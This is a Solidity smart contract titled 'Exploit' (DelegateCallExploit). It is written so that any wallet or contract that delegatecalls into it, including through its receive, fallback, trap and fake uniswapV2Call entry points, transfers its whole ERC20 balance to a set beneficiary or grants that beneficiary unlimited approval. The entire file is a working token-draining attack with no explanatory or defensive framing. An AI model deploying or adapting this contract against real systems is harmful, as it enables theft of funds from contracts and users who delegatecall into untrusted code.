// SPDX-License-Identifier: GPL-3.0
pragma solidity =0.8.17;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

/**
 * @title Exploit
 */
contract DelegateCallExploit {
    address asset;
    address beneficiary;

    constructor(address _asset, address _beneficiary) {
        asset = _asset;
        beneficiary = _beneficiary;
    }

    function stealNow() internal {
        uint balance = IERC20(asset).balanceOf(msg.sender);
        (bool success,) = asset.delegatecall(abi.encodeWithSignature("transfer(address,uint256)", beneficiary, balance));
        require(success, "transfer");
    }

    function stealLater() internal {
        (bool success,) = asset.delegatecall(abi.encodeWithSignature("approve(address,uint256)", beneficiary, (uint256)(int256(-1))));
        require(success, "approve");
    }

    function trap() external {
        stealNow();
    }

    receive() payable external {
        if (msg.value == 0) {
            stealNow();
        }
    }

    fallback() payable external {
        if (msg.value == 0) {
            stealNow();
        }
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        stealLater();
    }
}
